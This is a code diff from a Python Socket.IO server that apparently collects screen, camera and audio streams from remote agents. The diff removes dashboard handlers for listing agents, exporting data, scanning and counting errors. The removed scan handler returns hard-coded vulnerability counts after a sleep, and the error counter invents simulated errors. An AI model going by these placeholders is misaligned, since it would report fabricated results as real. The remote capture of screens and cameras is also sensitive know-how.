+WEBRTC_VIEWER_CONNECTIONS = {}
+VIDEO_FRAMES_H264 = defaultdict(lambda: None)
+CAMERA_FRAMES_H264 = defaultdict(lambda: None)
+AUDIO_FRAMES_OPUS = defaultdict(lambda: None)
 
 @socketio.on('screen_frame')
 def handle_screen_frame(data):
@@ -3028,170 +2574,6 @@ def handle_webrtc_implement_frame_dropping(data):
     except Exception as e:
         print(f"Error implementing frame dropping for {agent_id}: {e}")
         emit('webrtc_frame_dropping_result', {'error': str(e)}, room=request.sid)
-
-# New Socket.IO handlers for enhanced dashboard functionality
-@socketio.on('start_scan')
-def handle_start_scan(data):
-    """Handle scan start request from dashboard"""
-    agent_id = data.get('agent_id')
-    if not agent_id:
-        emit('scan_started', {'error': 'Agent ID required'})
-        return
-    
-    try:
-        # Emit scan started event
-        emit('scan_started', {'agent_id': agent_id, 'status': 'started'})
-        print(f"Scan started for agent {agent_id}")
-        
-        # Simulate scan completion after a delay (in production, this would be actual scanning)
-        import threading
-        def simulate_scan():
-            import time
-            time.sleep(3)  # Simulate 3 second scan
-            emit('scan_completed', {
-                'agent_id': agent_id, 
-                'status': 'completed',
-                'results': {'vulnerabilities': 2, 'warnings': 1, 'info': 3}
-            })
-            print(f"Scan completed for agent {agent_id}")
-        
-        threading.Thread(target=simulate_scan, daemon=True).start()
-        
-    except Exception as e:
-        print(f"Error starting scan for agent {agent_id}: {e}")
-        emit('scan_started', {'error': str(e)})
-
-@socketio.on('get_agents')
-def handle_get_agents():
-    """Handle agent list request from dashboard"""
-    try:
-        # Get list of connected agents
-        agents = []
-        for agent_id in WEBRTC_PEER_CONNECTIONS:
-            agents.append({
-                'id': agent_id,
-                'status': 'connected',
-                'connection_type': 'webrtc',
-                'last_seen': datetime.datetime.now().isoformat()
-            })
-        
-        # Also include agents with active streams
-        for agent_id in VIDEO_FRAMES_H264:
-            if not any(agent['id'] == agent_id for agent in agents):
-                agents.append({
-                    'id': agent_id,
-                    'status': 'streaming',
-                    'connection_type': 'socketio',
-                    'last_seen': datetime.datetime.now().isoformat()
-                })
-        
-        emit('agents_list', {'agents': agents, 'count': len(agents)})
-        print(f"Agent list sent: {len(agents)} agents")
-        
-    except Exception as e:
-        print(f"Error getting agent list: {e}")
-        emit('agents_list', {'error': str(e)})
-
-@socketio.on('export_data')
-def handle_export_data(data):
-    """Handle data export request from dashboard"""
-    try:
-        filters = data.get('filters', {})
-        timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
-        filename = f"dashboard_export_{timestamp}.json"
-        
-        # Collect export data based on filters
-        export_data = {
-            'timestamp': datetime.datetime.now().isoformat(),
-            'filters': filters,
-            'agents': [],
-            'streams': [],
-            'errors': [],
-            'metrics': {}
-        }
-        
-        # Add agent data
-        for agent_id in WEBRTC_PEER_CONNECTIONS:
-            export_data['agents'].append({
-                'id': agent_id,
-                'connection_type': 'webrtc',
-                'status': 'connected'
-            })
-        
-        # Add stream data
-        for agent_id in VIDEO_FRAMES_H264:
-            export_data['streams'].append({
-                'agent_id': agent_id,
-                'type': 'screen',
-                'status': 'active'
-            })
-        
-        for agent_id in CAMERA_FRAMES_H264:
-            export_data['streams'].append({
-                'agent_id': agent_id,
-                'type': 'camera',
-                'status': 'active'
-            })
-        
-        # Add metrics
-        export_data['metrics'] = {
-            'total_agents': len(export_data['agents']),
-            'total_streams': len(export_data['streams']),
-            'webrtc_connections': len(WEBRTC_PEER_CONNECTIONS)
-        }
-        
-        # Emit export completed event
-        emit('data_exported', {
-            'filename': filename,
-            'data': export_data,
-            'status': 'success'
-        })
-        
-        print(f"Data exported successfully: {filename}")
-        
-    except Exception as e:
-        print(f"Error exporting data: {e}")
-        emit('data_exported', {'error': str(e)})
-
-@socketio.on('update_error_counts')
-def handle_update_error_counts():
-    """Handle error counts update request from dashboard"""
-    try:
-        # Count different types of errors/statuses
-        total_errors = 0
-        critical_errors = 0
-        warning_errors = 0
-        info_errors = 0
-        
-        # This would typically analyze actual agent logs and status
-        # For now, using placeholder logic based on connection status
-        for agent_id in WEBRTC_PEER_CONNECTIONS:
-            # Simulate some error conditions
-            if agent_id in WEBRTC_STREAMS:
-                total_errors += 1
-                if len(WEBRTC_STREAMS[agent_id]) < 2:  # Missing some stream types
-                    warning_errors += 1
-                else:
-                    info_errors += 1
-        
-        # Add some simulated critical errors for demo
-        if len(WEBRTC_PEER_CONNECTIONS) == 0:
-            critical_errors += 1
-            total_errors += 1
-        
-        error_counts = {
-            'total': total_errors,
-            'critical': critical_errors,
-            'warning': warning_errors,
-            'info': info_errors
-        }
-        
-        emit('error_counts_updated', {'counts': error_counts})
-        print(f"Error counts updated: {error_counts}")
-        
-    except Exception as e:
-        print(f"Error updating error counts: {e}")
-        emit('error_counts_updated', {'error': str(e)})
 
 # WebRTC scaffolding code removed - not currently active
 
